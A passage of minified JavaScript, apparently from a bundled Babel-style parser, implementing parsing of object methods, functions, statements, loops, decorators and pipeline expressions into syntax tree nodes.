Q=this.getGetterSetterExpectedParamCount(X),Y=this.getObjectOrClassMethodParams(X);if(Y.length!==Q)this.raise(X.kind==="get"?b.BadGetterArity:b.BadSetterArity,X);if(X.kind==="set"&&((J=Y[Y.length-1])==null?void 0:J.type)==="RestElement")this.raise(b.BadSetterRestParameter,X)}parseObjectMethod(X,J,Q,Y,W){if(W){let z=this.parseMethod(X,J,!1,!1,!1,"ObjectMethod");return this.checkGetterSetterParams(z),z}if(Q||J||this.match(10)){if(Y)this.unexpected();return X.kind="method",X.method=!0,this.parseMethod(X,J,Q,!1,!1,"ObjectMethod")}}parseObjectProperty(X,J,Q,Y){if(X.shorthand=!1,this.eat(14))return X.value=Q?this.parseMaybeDefault(this.state.startLoc):this.parseMaybeAssignAllowInOrVoidPattern(8,Y),this.finishObjectProperty(X);if(!X.computed&&X.key.type==="Identifier"){if(this.checkReservedWord(X.key.name,X.key.loc.start,!0,!1),Q)X.value=this.parseMaybeDefault(J,this.cloneIdentifier(X.key));else if(this.match(29)){let W=this.state.startLoc;if(Y!=null){if(Y.shorthandAssignLoc===null)Y.shorthandAssignLoc=W}else this.raise(b.InvalidCoverInitializedName,W);X.value=this.parseMaybeDefault(J,this.cloneIdentifier(X.key))}else X.value=this.cloneIdentifier(X.key);return X.shorthand=!0,this.finishObjectProperty(X)}}finishObjectProperty(X){return this.finishNode(X,"ObjectProperty")}parseObjPropValue(X,J,Q,Y,W,z,G){let H=this.parseObjectMethod(X,Q,Y,W,z)||this.parseObjectProperty(X,J,W,G);if(!H)this.unexpected();return H}parsePropertyName(X,J){if(this.eat(0))X.computed=!0,X.key=this.parseMaybeAssignAllowIn(),this.expect(3);else{let{type:Q,value:Y}=this.state,W;if(I8(Q))W=this.parseIdentifier(!0);else switch(Q){case 135:W=this.parseNumericLiteral(Y);break;case 134:W=this.parseStringLiteral(Y);break;case 136:W=this.parseBigIntLiteral(Y);break;case 139:{let z=this.state.startLoc;if(J!=null){if(J.privateKeyLoc===null)J.privateKeyLoc=z}else this.raise(b.UnexpectedPrivateField,z);W=this.parsePrivateName();break}default:if(Q===137){W=this.parseDecimalLiteral(Y);break}this.unexpected()}if(X.key=W,Q!==139)X.computed=!1}}initFunction(X,J){X.id=null,X.generator=!1,X.async=J}parseMethod(X,J,Q,Y,W,z,G=!1){this.initFunction(X,Q),X.generator=J,this.scope.enter(530|(G?576:0)|(W?32:0)),this.prodParam.enter(W4(Q,X.generator)),this.parseFunctionParams(X,Y);let H=this.parseFunctionBodyAndFinish(X,z,!0);return this.prodParam.exit(),this.scope.exit(),H}parseArrayLike(X,J,Q,Y){if(Q)this.expectPlugin("recordAndTuple");let W=this.state.inFSharpPipelineDirectBody;this.state.inFSharpPipelineDirectBody=!1;let z=this.startNode();return this.next(),z.elements=this.parseExprList(X,!Q,Y,z),this.state.inFSharpPipelineDirectBody=W,this.finishNode(z,Q?"TupleExpression":"ArrayExpression")}parseArrowExpression(X,J,Q,Y){this.scope.enter(518);let W=W4(Q,!1);if(!this.match(5)&&this.prodParam.hasIn)W|=8;this.prodParam.enter(W),this.initFunction(X,Q);let z=this.state.maybeInArrowParameters;if(J)this.state.maybeInArrowParameters=!0,this.setArrowFunctionParameters(X,J,Y);return this.state.maybeInArrowParameters=!1,this.parseFunctionBody(X,!0),this.prodParam.exit(),this.scope.exit(),this.state.maybeInArrowParameters=z,this.finishNode(X,"ArrowFunctionExpression")}setArrowFunctionParameters(X,J,Q){this.toAssignableList(J,Q,!1),X.params=J}parseFunctionBodyAndFinish(X,J,Q=!1){return this.parseFunctionBody(X,!1,Q),this.finishNode(X,J)}parseFunctionBody(X,J,Q=!1){let Y=J&&!this.match(5);if(this.expressionScope.enter(VV()),Y)X.body=this.parseMaybeAssign(),this.checkParams(X,!1,J,!1);else{let W=this.state.strict,z=this.state.labels;this.state.labels=[],this.prodParam.enter(this.prodParam.currentFlags()|4),X.body=this.parseBlock(!0,!1,(G)=>{let H=!this.isSimpleParamList(X.params);if(G&&H)this.raise(b.IllegalLanguageModeDirective,(X.kind==="method"||X.kind==="constructor")&&!!X.key?X.key.loc.end:X);let U=!W&&this.state.strict;if(this.checkParams(X,!this.state.strict&&!J&&!Q&&!H,J,U),this.state.strict&&X.id)this.checkIdentifier(X.id,65,U)}),this.prodParam.exit(),this.state.labels=z}this.expressionScope.exit()}isSimpleParameter(X){return X.type==="Identifier"}isSimpleParamList(X){for(let J=0,Q=X.length;J<Q;J++)if(!this.isSimpleParameter(X[J]))return!1;return!0}checkParams(X,J,Q,Y=!0){let W=!J&&new Set,z={type:"FormalParameters"};for(let G of X.params)this.checkLVal(G,z,5,W,Y)}parseExprList(X,J,Q,Y){let W=[],z=!0;while(!this.eat(X)){if(z)z=!1;else if(this.expect(12),this.match(X)){if(Y)this.addTrailingCommaExtraToNode(Y);this.next();break}W.push(this.parseExprListItem(X,J,Q))}return W}parseExprListItem(X,J,Q,Y){let W;if(this.match(12)){if(!J)this.raise(b.UnexpectedToken,this.state.curPosition(),{unexpected:","});W=null}else if(this.match(21)){let z=this.state.startLoc;W=this.parseParenItem(this.parseSpread(Q),z)}else if(this.match(17)){if(this.expectPlugin("partialApplication"),!Y)this.raise(b.UnexpectedArgumentPlaceholder,this.state.startLoc);let z=this.startNode();this.next(),W=this.finishNode(z,"ArgumentPlaceholder")}else W=this.parseMaybeAssignAllowInOrVoidPattern(X,Q,this.parseParenItem);return W}parseIdentifier(X){let J=this.startNode(),Q=this.parseIdentifierName(X);return this.createIdentifier(J,Q)}createIdentifier(X,J){return X.name=J,X.loc.identifierName=J,this.finishNode(X,"Identifier")}createIdentifierAt(X,J,Q){return X.name=J,X.loc.identifierName=J,this.finishNodeAt(X,"Identifier",Q)}parseIdentifierName(X){let J,{startLoc:Q,type:Y}=this.state;if(I8(Y))J=this.state.value;else this.unexpected();let W=uT(Y);if(X){if(W)this.replaceToken(132)}else this.checkReservedWord(J,Q,W,!1);return this.next(),J}checkReservedWord(X,J,Q,Y){if(X.length>10)return;if(!z_(X))return;if(Q&&Y_(X)){this.raise(b.UnexpectedKeyword,J,{keyword:X});return}if((!this.state.strict?iK:Y?aK:rK)(X,this.inModule)){this.raise(b.UnexpectedReservedWord,J,{reservedWord:X});return}else if(X==="yield"){if(this.prodParam.hasYield){this.raise(b.YieldBindingIdentifier,J);return}}else if(X==="await"){if(this.prodParam.hasAwait){this.raise(b.AwaitBindingIdentifier,J);return}if(this.scope.inStaticBlock){this.raise(b.AwaitBindingIdentifierInStaticBlock,J);return}this.expressionScope.recordAsyncArrowParametersError(J)}else if(X==="arguments"){if(this.scope.inClassAndNotInNonArrowFunction){this.raise(b.ArgumentsInClass,J);return}}}recordAwaitIfAllowed(){let X=this.prodParam.hasAwait;if(X&&!this.scope.inFunction)this.state.hasTopLevelAwait=!0;return X}parseAwait(X){let J=this.startNodeAt(X);if(this.expressionScope.recordParameterInitializerError(b.AwaitExpressionFormalParameter,J),this.eat(55))this.raise(b.ObsoleteAwaitStar,J);if(!this.scope.inFunction&&!(this.optionFlags&1))if(this.isAmbiguousPrefixOrIdentifier())this.ambiguousScriptDifferentAst=!0;else this.sawUnambiguousESM=!0;if(!this.state.soloAwait)J.argument=this.parseMaybeUnary(null,!0);return this.finishNode(J,"AwaitExpression")}isAmbiguousPrefixOrIdentifier(){if(this.hasPrecedingLineBreak())return!0;let{type:X}=this.state;return X===53||X===10||X===0||G4(X)||X===102&&!this.state.containsEsc||X===138||X===56||this.hasPlugin("v8intrinsic")&&X===54}parseYield(X){let J=this.startNodeAt(X);this.expressionScope.recordParameterInitializerError(b.YieldInParameter,J);let Q=!1,Y=null;if(!this.hasPrecedingLineBreak())switch(Q=this.eat(55),this.state.type){case 13:case 140:case 8:case 11:case 3:case 9:case 14:case 12:if(!Q)break;default:Y=this.parseMaybeAssign()}return J.delegate=Q,J.argument=Y,this.finishNode(J,"YieldExpression")}parseImportCall(X){if(this.next(),X.source=this.parseMaybeAssignAllowIn(),X.options=null,this.eat(12))if(!this.match(11)){if(X.options=this.parseMaybeAssignAllowIn(),this.eat(12)){if(this.addTrailingCommaExtraToNode(X.options),!this.match(11)){do this.parseMaybeAssignAllowIn();while(this.eat(12)&&!this.match(11));this.raise(b.ImportCallArity,X)}}}else this.addTrailingCommaExtraToNode(X.source);return this.expect(11),this.finishNode(X,"ImportExpression")}checkPipelineAtInfixOperator(X,J){if(this.hasPlugin(["pipelineOperator",{proposal:"smart"}])){if(X.type==="SequenceExpression")this.raise(b.PipelineHeadSequenceExpression,J)}}parseSmartPipelineBodyInStyle(X,J){if(this.isSimpleReference(X)){let Q=this.startNodeAt(J);return Q.callee=X,this.finishNode(Q,"PipelineBareFunction")}else{let Q=this.startNodeAt(J);return this.checkSmartPipeTopicBodyEarlyErrors(J),Q.expression=X,this.finishNode(Q,"PipelineTopicExpression")}}isSimpleReference(X){switch(X.type){case"MemberExpression":return!X.computed&&this.isSimpleReference(X.object);case"Identifier":return!0;default:return!1}}checkSmartPipeTopicBodyEarlyErrors(X){if(this.match(19))throw this.raise(b.PipelineBodyNoArrow,this.state.startLoc);if(!this.topicReferenceWasUsedInCurrentContext())this.raise(b.PipelineTopicUnused,X)}withTopicBindingContext(X){let J=this.state.topicContext;this.state.topicContext={maxNumOfResolvableTopics:1,maxTopicIndex:null};try{return X()}finally{this.state.topicContext=J}}withSmartMixTopicForbiddingContext(X){if(this.hasPlugin(["pipelineOperator",{proposal:"smart"}])){let J=this.state.topicContext;this.state.topicContext={maxNumOfResolvableTopics:0,maxTopicIndex:null};try{return X()}finally{this.state.topicContext=J}}else return X()}withSoloAwaitPermittingContext(X){let J=this.state.soloAwait;this.state.soloAwait=!0;try{return X()}finally{this.state.soloAwait=J}}allowInAnd(X){let J=this.prodParam.currentFlags();if(8&~J){this.prodParam.enter(J|8);try{return X()}finally{this.prodParam.exit()}}return X()}disallowInAnd(X){let J=this.prodParam.currentFlags();if(8&J){this.prodParam.enter(J&-9);try{return X()}finally{this.prodParam.exit()}}return X()}registerTopicReference(){this.state.topicContext.maxTopicIndex=0}topicReferenceIsAllowedInCurrentContext(){return this.state.topicContext.maxNumOfResolvableTopics>=1}topicReferenceWasUsedInCurrentContext(){return this.state.topicContext.maxTopicIndex!=null&&this.state.topicContext.maxTopicIndex>=0}parseFSharpPipelineBody(X){let J=this.state.startLoc;this.state.potentialArrowAt=this.state.start;let Q=this.state.inFSharpPipelineDirectBody;this.state.inFSharpPipelineDirectBody=!0;let Y=this.parseExprOp(this.parseMaybeUnaryOrPrivate(),J,X);return this.state.inFSharpPipelineDirectBody=Q,Y}parseModuleExpression(){this.expectPlugin("moduleBlocks");let X=this.startNode();if(this.next(),!this.match(5))this.unexpected(null,5);let J=this.startNodeAt(this.state.endLoc);this.next();let Q=this.initializeScopes(!0);this.enterInitialScopes();try{X.body=this.parseProgram(J,8,"module")}finally{Q()}return this.finishNode(X,"ModuleExpression")}parseVoidPattern(X){this.expectPlugin("discardBinding");let J=this.startNode();if(X!=null)X.voidPatternLoc=this.state.startLoc;return this.next(),this.finishNode(J,"VoidPattern")}parseMaybeAssignAllowInOrVoidPattern(X,J,Q){if(J!=null&&this.match(88)){let Y=this.lookaheadCharCode();if(Y===44||Y===(X===3?93:X===8?125:41)||Y===61)return this.parseMaybeDefault(this.state.startLoc,this.parseVoidPattern(J))}return this.parseMaybeAssignAllowIn(J,Q)}parsePropertyNamePrefixOperator(X){}}var lY={kind:1},f_={kind:2},g_=/[\uD800-\uDFFF]/u,pY=/in(?:stanceof)?/y;function h_(X,J,Q){for(let Y=0;Y<X.length;Y++){let W=X[Y],{type:z}=W;if(typeof z==="number"){{if(z===139){let{loc:G,start:H,value:U,end:K}=W,V=H+1,B=C9(G.start,1);X.splice(Y,1,new R6({type:O6(27),value:"#",start:H,end:V,startLoc:G.start,endLoc:B}),new R6({type:O6(132),value:U,start:V,end:K,startLoc:B,endLoc:G.end})),Y++;continue}if(G4(z)){let{loc:G,start:H,value:U,end:K}=W,V=H+1,B=C9(G.start,1),Z;if(J.charCodeAt(H-Q)===96)Z=new R6({type:O6(22),value:"`",start:H,end:V,startLoc:G.start,endLoc:B});else Z=new R6({type:O6(8),value:"}",start:H,end:V,startLoc:G.start,endLoc:B});let M,F,j,O;if(z===24)F=K-1,j=C9(G.end,-1),M=U===null?null:U.slice(1,-1),O=new R6({type:O6(22),value:"`",start:F,end:K,startLoc:j,endLoc:G.end});else F=K-2,j=C9(G.end,-2),M=U===null?null:U.slice(1,-2),O=new R6({type:O6(23),value:"${",start:F,end:K,startLoc:j,endLoc:G.end});X.splice(Y,1,Z,new R6({type:O6(20),value:M,start:V,end:F,startLoc:B,endLoc:j}),O),Y+=2;continue}}W.type=O6(z)}}return X}class AV extends RV{parseTopLevel(X,J){if(X.program=this.parseProgram(J,140,this.options.sourceType==="module"?"module":"script"),X.comments=this.comments,this.optionFlags&256)X.tokens=h_(this.tokens,this.input,this.startIndex);return this.finishNode(X,"File")}parseProgram(X,J,Q){if(X.sourceType=Q,X.interpreter=this.parseInterpreterDirective(),this.parseBlockBody(X,!0,!0,J),this.inModule){if(!(this.optionFlags&64)&&this.scope.undefinedExports.size>0)for(let[W,z]of Array.from(this.scope.undefinedExports))this.raise(b.ModuleExportUndefined,z,{localName:W});this.addExtra(X,"topLevelAwait",this.state.hasTopLevelAwait)}let Y;if(J===140)Y=this.finishNode(X,"Program");else Y=this.finishNodeAt(X,"Program",C9(this.state.startLoc,-1));return Y}stmtToDirective(X){let J=this.castNodeTo(X,"Directive"),Q=this.castNodeTo(X.expression,"DirectiveLiteral"),Y=Q.value,W=this.input.slice(this.offsetToSourcePos(Q.start),this.offsetToSourcePos(Q.end)),z=Q.value=W.slice(1,-1);return this.addExtra(Q,"raw",W),this.addExtra(Q,"rawValue",z),this.addExtra(Q,"expressionValue",Y),J.value=Q,delete X.expression,J}parseInterpreterDirective(){if(!this.match(28))return null;let X=this.startNode();return X.value=this.state.value,this.next(),this.finishNode(X,"InterpreterDirective")}isLet(){if(!this.isContextual(100))return!1;return this.hasFollowingBindingAtom()}isUsing(){if(!this.isContextual(107))return!1;let X=this.nextTokenInLineStart(),J=this.codePointAtPos(X);return this.chStartsBindingIdentifier(J,X)}isForUsing(){if(!this.isContextual(107))return!1;let X=this.nextTokenInLineStart(),J=this.codePointAtPos(X);if(this.isUnparsedContextual(X,"of")){let Q=this.lookaheadCharCodeSince(X+2);if(Q!==61&&Q!==58&&Q!==59)return!1}if(this.chStartsBindingIdentifier(J,X)||this.isUnparsedContextual(X,"void"))return!0;return!1}isAwaitUsing(){if(!this.isContextual(96))return!1;let X=this.nextTokenInLineStart();if(this.isUnparsedContextual(X,"using")){X=this.nextTokenInLineStartSince(X+5);let J=this.codePointAtPos(X);if(this.chStartsBindingIdentifier(J,X))return!0}return!1}chStartsBindingIdentifier(X,J){if(N6(X)){if(pY.lastIndex=J,pY.test(this.input)){let Q=this.codePointAtPos(pY.lastIndex);if(!fJ(Q)&&Q!==92)return!1}return!0}else if(X===92)return!0;else return!1}chStartsBindingPattern(X){return X===91||X===123}hasFollowingBindingAtom(){let X=this.nextTokenStart(),J=this.codePointAtPos(X);return this.chStartsBindingPattern(J)||this.chStartsBindingIdentifier(J,X)}hasInLineFollowingBindingIdentifierOrBrace(){let X=this.nextTokenInLineStart(),J=this.codePointAtPos(X);return J===123||this.chStartsBindingIdentifier(J,X)}allowsUsing(){return(this.scope.inModule||!this.scope.inTopLevel)&&!this.scope.inBareCaseStatement}parseModuleItem(){return this.parseStatementLike(15)}parseStatementListItem(){return this.parseStatementLike(6|(!this.options.annexB||this.state.strict?0:8))}parseStatementOrSloppyAnnexBFunctionDeclaration(X=!1){let J=0;if(this.options.annexB&&!this.state.strict){if(J|=4,X)J|=8}return this.parseStatementLike(J)}parseStatement(){return this.parseStatementLike(0)}parseStatementLike(X){let J=null;if(this.match(26))J=this.parseDecorators(!0);return this.parseStatementContent(X,J)}parseStatementContent(X,J){let Q=this.state.type,Y=this.startNode(),W=!!(X&2),z=!!(X&4),G=X&1;switch(Q){case 60:return this.parseBreakContinueStatement(Y,!0);case 63:return this.parseBreakContinueStatement(Y,!1);case 64:return this.parseDebuggerStatement(Y);case 90:return this.parseDoWhileStatement(Y);case 91:return this.parseForStatement(Y);case 68:if(this.lookaheadCharCode()===46)break;if(!z)this.raise(this.state.strict?b.StrictFunction:this.options.annexB?b.SloppyFunctionAnnexB:b.SloppyFunction,this.state.startLoc);return this.parseFunctionStatement(Y,!1,!W&&z);case 80:if(!W)this.unexpected();return this.parseClass(this.maybeTakeDecorators(J,Y),!0);case 69:return this.parseIfStatement(Y);case 70:return this.parseReturnStatement(Y);case 71:return this.parseSwitchStatement(Y);case 72:return this.parseThrowStatement(Y);case 73:return this.parseTryStatement(Y);case 96:if(this.isAwaitUsing()){if(!this.allowsUsing())this.raise(b.UnexpectedUsingDeclaration,Y);else if(!W)this.raise(b.UnexpectedLexicalDeclaration,Y);else if(!this.recordAwaitIfAllowed())this.raise(b.AwaitUsingNotInAsyncContext,Y);return this.next(),this.parseVarStatement(Y,"await using")}break;case 107:if(this.state.containsEsc||!this.hasInLineFollowingBindingIdentifierOrBrace())break;if(!this.allowsUsing())this.raise(b.UnexpectedUsingDeclaration,this.state.startLoc);else if(!W)this.raise(b.UnexpectedLexicalDeclaration,this.state.startLoc);return this.parseVarStatement(Y,"using");case 100:{if(this.state.containsEsc)break;let K=this.nextTokenStart(),V=this.codePointAtPos(K);if(V!==91){if(!W&&this.hasFollowingLineBreak())break;if(!this.chStartsBindingIdentifier(V,K)&&V!==123)break}}case 75:if(!W)this.raise(b.UnexpectedLexicalDeclaration,this.state.startLoc);case 74:{let K=this.state.value;return this.parseVarStatement(Y,K)}case 92:return this.parseWhileStatement(Y);case 76:return this.parseWithStatement(Y);case 5:return this.parseBlock();case 13:return this.parseEmptyStatement(Y);case 83:{let K=this.lookaheadCharCode();if(K===40||K===46)break}case 82:{if(!(this.optionFlags&8)&&!G)this.raise(b.UnexpectedImportExport,this.state.startLoc);this.next();let K;if(Q===83)K=this.parseImport(Y);else K=this.parseExport(Y,J);return this.assertModuleNodeAllowed(K),K}default:if(this.isAsyncFunction()){if(!W)this.raise(b.AsyncFunctionInSingleStatementContext,this.state.startLoc);return this.next(),this.parseFunctionStatement(Y,!0,!W&&z)}}let H=this.state.value,U=this.parseExpression();if(C0(Q)&&U.type==="Identifier"&&this.eat(14))return this.parseLabeledStatement(Y,H,U,X);else return this.parseExpressionStatement(Y,U,J)}assertModuleNodeAllowed(X){if(!(this.optionFlags&8)&&!this.inModule)this.raise(b.ImportOutsideModule,X)}decoratorsEnabledBeforeExport(){if(this.hasPlugin("decorators-legacy"))return!0;return this.hasPlugin("decorators")&&this.getPluginOption("decorators","decoratorsBeforeExport")!==!1}maybeTakeDecorators(X,J,Q){if(X){var Y;if((Y=J.decorators)!=null&&Y.length){if(typeof this.getPluginOption("decorators","decoratorsBeforeExport")!=="boolean")this.raise(b.DecoratorsBeforeAfterExport,J.decorators[0]);J.decorators.unshift(...X)}else J.decorators=X;if(this.resetStartLocationFromNode(J,X[0]),Q)this.resetStartLocationFromNode(Q,J)}return J}canHaveLeadingDecorator(){return this.match(80)}parseDecorators(X){let J=[];do J.push(this.parseDecorator());while(this.match(26));if(this.match(82)){if(!X)this.unexpected();if(!this.decoratorsEnabledBeforeExport())this.raise(b.DecoratorExportClass,this.state.startLoc)}else if(!this.canHaveLeadingDecorator())throw this.raise(b.UnexpectedLeadingDecorator,this.state.startLoc);return J}parseDecorator(){this.expectOnePlugin(["decorators","decorators-legacy"]);let X=this.startNode();if(this.next(),this.hasPlugin("decorators")){let J=this.state.startLoc,Q;if(this.match(10)){let Y=this.state.startLoc;this.next(),Q=this.parseExpression(),this.expect(11),Q=this.wrapParenthesis(Y,Q);let W=this.state.startLoc;if(X.expression=this.parseMaybeDecoratorArguments(Q,Y),this.getPluginOption("decorators","allowCallParenthesized")===!1&&X.expression!==Q)this.raise(b.DecoratorArgumentsOutsideParentheses,W)}else{Q=this.parseIdentifier(!1);while(this.eat(16)){let Y=this.startNodeAt(J);if(Y.object=Q,this.match(139))this.classScope.usePrivateName(this.state.value,this.state.startLoc),Y.property=this.parsePrivateName();else Y.property=this.parseIdentifier(!0);Y.computed=!1,Q=this.finishNode(Y,"MemberExpression")}X.expression=this.parseMaybeDecoratorArguments(Q,J)}}else X.expression=this.parseExprSubscripts();return this.finishNode(X,"Decorator")}parseMaybeDecoratorArguments(X,J){if(this.eat(10)){let Q=this.startNodeAt(J);return Q.callee=X,Q.arguments=this.parseCallExpressionArguments(),this.toReferencedList(Q.arguments),this.finishNode(Q,"CallExpression")}return X}parseBreakContinueStatement(X,J){if(this.next(),this.isLineTerminator())X.label=null;else X.label=this.parseIdentifier(),this.semicolon();return this.verifyBreakContinue(X,J),this.finishNode(X,J?"BreakStatement":"ContinueStatement")}verifyBreakContinue(X,J){let Q;for(Q=0;Q<this.state.labels.length;++Q){let Y=this.state.labels[Q];if(X.label==null||Y.name===X.label.name){if(Y.kind!=null&&(J||Y.kind===1))break;if(X.label&&J)break}}if(Q===this.state.labels.length){let Y=J?"BreakStatement":"ContinueStatement";this.raise(b.IllegalBreakContinue,X,{type:Y})}}parseDebuggerStatement(X){return this.next(),this.semicolon(),this.finishNode(X,"DebuggerStatement")}parseHeaderExpression(){this.expect(10);let X=this.parseExpression();return this.expect(11),X}parseDoWhileStatement(X){return this.next(),this.state.labels.push(lY),X.body=this.withSmartMixTopicForbiddingContext(()=>this.parseStatement()),this.state.labels.pop(),this.expect(92),X.test=this.parseHeaderExpression(),this.eat(13),this.finishNode(X,"DoWhileStatement")}parseForStatement(X){this.next(),this.state.labels.push(lY);let J=null;if(this.isContextual(96)&&this.recordAwaitIfAllowed())J=this.state.startLoc,this.next();if(this.scope.enter(0),this.expect(10),this.match(13)){if(J!==null)this.unexpected(J);return this.parseFor(X,null)}let Q=this.isContextual(100);{let H=this.isAwaitUsing(),U=H||this.isForUsing(),K=Q&&this.hasFollowingBindingAtom()||U;if(this.match(74)||this.match(75)||K){let V=this.startNode(),B;if(H){if(B="await using",!this.recordAwaitIfAllowed())this.raise(b.AwaitUsingNotInAsyncContext,this.state.startLoc);this.next()}else B=this.state.value;this.next(),this.parseVar(V,!0,B);let Z=this.finishNode(V,"VariableDeclaration"),M=this.match(58);if(M&&U)this.raise(b.ForInUsing,Z);if((M||this.isContextual(102))&&Z.declarations.length===1)return this.parseForIn(X,Z,J);if(J!==null)this.unexpected(J);return this.parseFor(X,Z)}}let Y=this.isContextual(95),W=new O5,z=this.parseExpression(!0,W),G=this.isContextual(102);if(G){if(Q)this.raise(b.ForOfLet,z);if(J===null&&Y&&z.type==="Identifier")this.raise(b.ForOfAsync,z)}if(G||this.match(58)){this.checkDestructuringPrivate(W),this.toAssignable(z,!0);let H=G?"ForOfStatement":"ForInStatement";return this.checkLVal(z,{type:H}),this.parseForIn(X,z,J)}else this.checkExpressionErrors(W,!0);if(J!==null)this.unexpected(J);return this.parseFor(X,z)}parseFunctionStatement(X,J,Q){return this.next(),this.parseFunction(X,1|(Q?2:0)|(J?8:0))}parseIfStatement(X){return this.next(),X.test=this.parseHeaderExpression(),X.consequent=this.parseStatementOrSloppyAnnexBFunctionDeclaration(),X.alternate=this.eat(66)?this.parseStatementOrSloppyAnnexBFunctionDeclaration():null,this.finishNode(X,"IfStatement")}parseReturnStatement(X){if(!this.prodParam.hasReturn)this.raise(b.IllegalReturn,this.state.startLoc);if(this.next(),this.isLineTerminator())X.argument=null;else X.argument=this.parseExpression(),this.semicolon();return this.finishNode(X,"ReturnStatement")}parseSwitchStatement(X){this.next(),X.discriminant=this.parseHeaderExpression();let J=X.cases=[];this.expect(5),this.state.labels.push(f_),this.scope.enter(256);let Q;for(let Y;!this.match(8);)if(this.match(61)||this.match(65)){let W=this.match(61);if(Q)this.finishNode(Q,"SwitchCase");if(J.push(Q=this.startNode()),Q.consequent=[],this.next(),W)Q.test=this.parseExpression();else{if(Y)this.raise(b.MultipleDefaultsInSwitch,this.state.lastTokStartLoc);Y=!0,Q.test=null}this.expect(14)}else if(Q)Q.consequent.push(this.parseStatementListItem());else this.unexpected();if(this.scope.exit(),Q)this.finishNode(Q,"SwitchCase");return this.next(),this.state.labels.pop(),this.finishNode(X,"SwitchStatement")}parseThrowStatement(X){if(this.next(),this.hasPrecedingLineBreak())this.raise(b.NewlineAfterThrow,this.state.lastTokEndLoc);return X.argument=this.parseExpression(),this.semicolon(),this.finishNode(X,"ThrowStatement")}parseCatchClauseParam(){let X=this.parseBindingAtom();return this.scope.enter(this.options.annexB&&X.type==="Identifier"?8:0),this.checkLVal(X,{type:"CatchClause"},9),X}parseTryStatement(X){if(this.next(),X.block=this.parseBlock(),X.handler=null,this.match(62)){let J=this.startNode();if(this.next(),this.match(10))this.expect(10),J.param=this.parseCatchClauseParam(),this.expect(11);else J.param=null,this.scope.enter(0);J.body=this.withSmartMixTopicForbiddingContext(()=>this.parseBlock(!1,!1)),this.scope.exit(),X.handler=this.finishNode(J,"CatchClause")}if(X.finalizer=this.eat(67)?this.parseBlock():null,!X.handler&&!X.finalizer)this.raise(b.NoCatchOrFinally,X);return this.finishNode(X,"TryStatement")}parseVarStatement(X,J,Q=!1){return this.next(),this.parseVar(X,!1,J,Q),this.semicolon(),this.finishNode(X,"VariableDeclaration")}parseWhileStatement(X){return this.next(),X.test=this.parseHeaderExpression(),this.state.labels.push(lY),X.body=this.withSmartMixTopicForbiddingContext(()=>this.parseStatement()),this.state.labels.pop(),this.finishNode(X,"WhileStatement")}parseWithStatement(X){if(this.state.strict)this.raise(b.StrictWith,this.state.startLoc);return this.next(),X.object=this.parseHeaderExpression(),X.body=this.withSmartMixTopicForbiddingContext(()=>this.parseStatement()),this.finishNode(X,"WithStatement")}parseEmptyStatement(X){return this.next(),this.finishNode(X,"EmptyStatement")}parseLabeledStatement(X,J,Q,Y){for(let z of this.state.labels)if(z.name===J)this.raise(b.LabelRedeclaration,Q,{labelName:J});let W=pT(this.state.type)?1:this.match(71)?2:null;for(let z=this.state.labels.length-1;z>=0;z--){let G=this.state.labels[z];if(G.statementStart===X.start)G.statementStart=this.sourceToOffsetPos(this.state.start),G.kind=W;else break}return this.state.labels.push({name:J,kind:W,statementStart:this.sourceToOffsetPos(this.state.start)}),X.body=Y&8?this.parseStatementOrSloppyAnnexBFunctionDeclaration(!0):this.parseStatement(),this.state.labels.pop(),X.label=Q,this.finishNode(X,"LabeledStatement")}parseExpressionStatement(X,J,Q){return X.expression=J,this.semicolon(),this.finishNode(X,"ExpressionStatement")}parseBlock(X=!1,J=!0,Q){let Y=this.startNode();if(X)this.state.strictErrors.clear();if(this.expect(5),J)this.scope.enter(0);if(this.parseBlockBody(Y,X,!1,8,Q),J)this.scope.exit();return this.finishNode(Y,"BlockStatement")}isValidDirective(X){return X.type==="ExpressionStatement"&&X.expression.type==="StringLiteral"&&!X.expression.extra.parenthesized}parseBlockBody(X,J,Q,Y,W){let z=X.body=[],G=X.directives=[];this.parseBlockOrModuleBlockBody(z,J?G:void 0,Q,Y,W)}parseBlockOrModuleBlockBody(X,J,Q,Y,W){let z=this.state.strict,G=!1,H=!1;while(!this.match(Y)){let U=Q?this.parseModuleItem():this.parseStatementListItem();if(J&&!H){if(this.isValidDirective(U)){let K=this.stmtToDirective(U);if(J.push(K),!G&&K.value.value==="use strict")G=!0,this.setStrict(!0);continue}H=!0,this.state.strictErrors.clear()}X.push(U)}if(W==null||W.call(this,G),!z)this.setStrict(!1);this.next()}parseFor(X,J){return X.init=J,this.semicolon(!1),X.test=this.match(13)?null:this.parseExpression(),this.semicolon(!1),X.update=this.match(11)?null:this.parseExpression(),this.expect(11),X.body=this.withSmartMixTopicForbiddingContext(()=>this.parseStatement()),this.scope.exit(),this.state.labels.pop(),this.finishNode(X,"ForStatement")}parseForIn(X,J,Q){let Y=this.match(58);if(this.next(),Y){if(Q!==null)this.unexpected(Q)}else X.await=Q!==null;if(J.type==="VariableDeclaration"&&J.declarations[0].init!=null&&(!Y||!this.options.annexB||this.state.strict||J.kind!=="var"||J.declarations[0].id.type!=="Identifier"))this.raise(b.ForInOfLoopInitializer,J,{type:Y?"ForInStatement":"ForOfStatement"});if(J.type==="AssignmentPattern")this.raise(b.InvalidLhs,J,{ancestor:{type:"ForStatement"}});return X.left=J,X.right=Y?this.parseExpression():this.parseMaybeAssignAllowIn(),this.expect(11),X.body=this.withSmartMixTopicForbiddingContext(()=>this.parseStatement()),this.scope.exit(),this.state.labels.pop(),this.finishNode(X,Y?"ForInStatement":"ForOfStatement")}parseVar(X,J,Q,Y=!1){let W=X.declarations=[];X.kind=Q;for(;;){let z=this.startNode();if(this.parseVarId(z,Q),z.init=!this.eat(29)?null:J?this.parseMaybeAssignDisallowIn():this.parseMaybeAssignAllowIn(),z.init===null&&!Y){if(z.id.type!=="Identifier"&&!(J&&(this.match(58)||this.isContextual(102))))this.raise(b.DeclarationMissingInitializer,this.state.lastTokEndLoc,{kind:"destructuring"});else if((Q==="const"||Q==="using"||Q==="await using")&&!(this.match(58)||this.isContextual(102)))this.raise(b.DeclarationMissingInitializer,this.state.lastTokEndLoc,{kind:Q})}if(W.push(this.finishNode(z,"VariableDeclarator")),!this.eat(12))break}return X}parseVarId(X,J){let Q=this.parseBindingAtom();if(J==="using"||J==="await using"){if(Q.type==="ArrayPattern"||Q.type==="ObjectPattern")this.raise(b.UsingDeclarationHasBindingPattern,Q.loc.start)}else if(Q.type==="VoidPattern")this.raise(b.UnexpectedVoidPattern,Q.loc.start);this.checkLVal(Q,{type:"VariableDeclarator"},J==="var"?5:8201),X.id=Q}parseAsyncFunctionExpression(X){return 